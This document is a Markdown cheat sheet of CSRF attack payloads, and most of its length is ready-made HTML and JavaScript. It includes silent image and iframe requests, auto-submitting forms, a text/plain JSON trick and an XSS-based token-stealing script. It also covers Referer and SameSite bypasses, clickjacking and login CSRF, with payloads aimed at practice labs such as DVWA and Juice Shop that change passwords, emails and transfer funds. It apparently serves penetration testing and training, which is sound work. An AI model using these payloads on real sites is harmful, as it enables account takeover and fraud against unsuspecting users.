# CSRF Hints & Cheat Sheet

Quick reference for CSRF testing, payloads, and bypass techniques.

---

## Quick CSRF Payloads

### GET-Based CSRF

```html
<!-- Image tag (silent) -->
<img src="http://target.com/action?param=value" width="0" height="0">

<!-- Script tag -->
<script src="http://target.com/action?param=value"></script>

<!-- Iframe (silent) -->
<iframe src="http://target.com/action?param=value" style="display:none"></iframe>

<!-- Link (requires click) -->
<a href="http://target.com/action?param=value">Click for prize!</a>

<!-- Redirect -->
<meta http-equiv="refresh" content="0;url=http://target.com/action?param=value">

<!-- JavaScript redirect -->
<script>window.location="http://target.com/action?param=value";</script>
```

### POST-Based CSRF

```html
<!-- Auto-submit form -->
<form action="http://target.com/action" method="POST" id="csrf">
    <input type="hidden" name="param1" value="value1">
    <input type="hidden" name="param2" value="value2">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- With body onload -->
<body onload="document.forms[0].submit()">
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="param" value="value">
</form>
</body>

<!-- Into hidden iframe (silent) -->
<iframe name="csrf-frame" style="display:none"></iframe>
<form action="http://target.com/action" method="POST" target="csrf-frame" id="csrf">
    <input type="hidden" name="param" value="value">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON-Based CSRF

```html
<!-- Using text/plain enctype -->
<form action="http://target.com/api/action" method="POST" enctype="text/plain">
    <input name='{"param":"value","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- Creates body: {"param":"value","ignore":"="} -->
```

### XMLHttpRequest CSRF (Same-Origin Only)

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/action", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("param1=value1&param2=value2");
</script>
```

---

## Platform-Specific Payloads

### DVWA

```html
<!-- Low Security (GET) -->
<img src="http://localhost:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">

<!-- Medium Security (Referer check) -->
<!-- Host page on domain containing "localhost:8081" -->

<!-- High Security (requires XSS to steal token) -->
<script>
fetch('/vulnerabilities/csrf/')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/user_token' value='([^']+)'/)[1];
    new Image().src = '/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=' + token;
  });
</script>
```

### bWAPP

```html
<!-- CSRF Change Password -->
<img src="http://localhost:8082/bWAPP/csrf_1.php?password_new=pwned&password_conf=pwned&action=change">

<!-- CSRF Transfer Amount -->
<body onload="document.forms[0].submit()">
<form action="http://localhost:8082/bWAPP/csrf_2.php" method="POST">
    <input type="hidden" name="account" value="attacker">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="action" value="transfer">
</form>
</body>
```

### Juice Shop

```html
<!-- JSON API CSRF -->
<form action="http://localhost:3000/api/Users/1" method="POST" enctype="text/plain">
    <input name='{"email":"evil@attacker.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### WebGoat

```html
<!-- Basic CSRF -->
<form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
    <input type="hidden" name="csrf" value="false">
</form>
<script>document.forms[0].submit();</script>
```

---

## Token Bypass Techniques

### Remove Token

```html
<!-- Original request has token, try without it -->
<form action="http://target.com/action" method="POST">
    <!-- No token field -->
    <input type="hidden" name="email" value="evil@attacker.com">
</form>
```

### Empty Token

```html
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="email" value="evil@attacker.com">
</form>
```

### Static Token

```html
<!-- If token is static or predictable -->
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="known_static_value">
    <input type="hidden" name="email" value="evil@attacker.com">
</form>
```

### Token from Different Session

```html
<!-- Use your own valid token for attacking another user -->
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="your_valid_token">
    <input type="hidden" name="email" value="evil@attacker.com">
</form>
```

### Cookie-Based Token

```html
<!-- If token is in cookie and form parameter, set both -->
<script>
document.cookie = "csrf_token=attacker_value; path=/";
</script>
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="attacker_value">
</form>
```

### Token via XSS

```javascript
// Fetch page, extract token, submit CSRF
fetch('/target-page')
  .then(r => r.text())
  .then(html => {
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, 'text/html');
    var token = doc.querySelector('input[name="csrf_token"]').value;

    // Create and submit form with stolen token
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/action';

    var tokenInput = document.createElement('input');
    tokenInput.name = 'csrf_token';
    tokenInput.value = token;
    form.appendChild(tokenInput);

    var emailInput = document.createElement('input');
    emailInput.name = 'email';
    emailInput.value = 'evil@attacker.com';
    form.appendChild(emailInput);

    document.body.appendChild(form);
    form.submit();
  });
```

---

## Referer Bypass

### Suppress Referer

```html
<meta name="referrer" content="no-referrer">
<a href="http://target.com/action?param=value">Click</a>
```

### Referer with Target Domain

```html
<!-- Host attack on: http://attacker.com/target.com/attack.html -->
<!-- Referer will contain: attacker.com/target.com -->

<!-- Or use: http://target.com.attacker.com/ -->
```

### Data URL (No Referer)

```html
<a href="data:text/html,<form action='http://target.com/action' method='POST'><input name='param' value='evil'></form><script>document.forms[0].submit()</script>">Click</a>
```

---

## SameSite Bypass

### Lax Mode Bypass

```html
<!-- SameSite=Lax allows top-level navigation GET requests -->
<a href="http://target.com/action?param=evil">Click me!</a>

<!-- With anchor click JavaScript -->
<a id="link" href="http://target.com/action?param=evil"></a>
<script>document.getElementById('link').click();</script>
```

### Method Override

```html
<!-- If server accepts method override -->
<form action="http://target.com/action?_method=POST" method="GET">
    <input name="param" value="evil">
</form>
```

### New Cookie Exception

```
Cookies created in the last 2 minutes may be sent
even with SameSite=Lax on some browsers
```

---

## Special Techniques

### CSRF + Clickjacking

```html
<style>
iframe {
    position: absolute;
    opacity: 0.0001;
    z-index: 2;
}
button {
    position: absolute;
    z-index: 1;
}
</style>
<button>Click for prize!</button>
<iframe src="http://target.com/action-page"></iframe>
```

### Login CSRF

```html
<body onload="document.forms[0].submit()">
<form action="http://target.com/login" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="attacker_pass">
</form>
</body>

<!-- Victim is now logged in as attacker -->
```

### File Upload CSRF

```html
<!-- Limited - can't set file content cross-origin -->
<!-- But can trigger upload of user-selected file -->
<form action="http://target.com/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="param" value="value">
</form>
```

### WebSocket CSRF

```javascript
// WebSockets don't respect SameSite
// If target allows WebSocket connections
var ws = new WebSocket('wss://target.com/socket');
ws.onopen = function() {
    ws.send('malicious command');
};
```

---

## Detection Checklist

```
[ ] Identify all state-changing requests
[ ] Check for CSRF token presence
[ ] Check token validation:
    [ ] Is it validated?
    [ ] Is it tied to session?
    [ ] Is it tied to user?
    [ ] Can it be reused?
    [ ] Is it predictable?
[ ] Check Referer/Origin validation
[ ] Check SameSite cookie attributes
[ ] Check custom header requirements
[ ] Test from different origin
```

---

## Quick Reference Tables

### SameSite Cookie Behavior

| Attribute | Cross-site Request | Top-level Navigation |
|-----------|-------------------|---------------------|
| None | Sent | Sent |
| Lax | Not Sent | Sent (GET only) |
| Strict | Not Sent | Not Sent |

### Content-Type and CSRF

| Content-Type | CSRF Possible? |
|--------------|----------------|
| application/x-www-form-urlencoded | Yes (form) |
| multipart/form-data | Yes (form) |
| text/plain | Yes (form) |
| application/json | Limited (needs CORS) |

### Form Enctypes

| Enctype | Use Case |
|---------|----------|
| application/x-www-form-urlencoded | Default, key=value |
| multipart/form-data | File uploads |
| text/plain | JSON tricks |

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Token required | Try removing, emptying, or stealing via XSS |
| Referer checked | Use referrer-policy or domain tricks |
| SameSite blocking | Use top-level navigation for Lax |
| JSON required | Use text/plain enctype trick |
| Custom header needed | Likely not exploitable without XSS |
| CORS blocking | CSRF usually works despite CORS |

---

## OWASP References

- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)

## Additional Resources

- [PayloadsAllTheThings - CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
- [PortSwigger CSRF Labs](https://portswigger.net/web-security/csrf)
- [HackTricks - CSRF](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)
